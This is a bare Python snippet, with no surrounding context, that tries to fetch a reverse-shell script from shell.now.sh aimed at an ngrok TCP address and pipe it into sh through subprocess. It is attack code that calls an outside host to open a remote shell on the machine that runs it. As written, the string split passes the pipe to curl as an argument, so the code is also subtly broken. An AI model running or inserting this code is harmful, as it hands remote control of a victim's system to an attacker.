bashCommand = "curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh"
import subprocess
process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
output, error = process.communicate()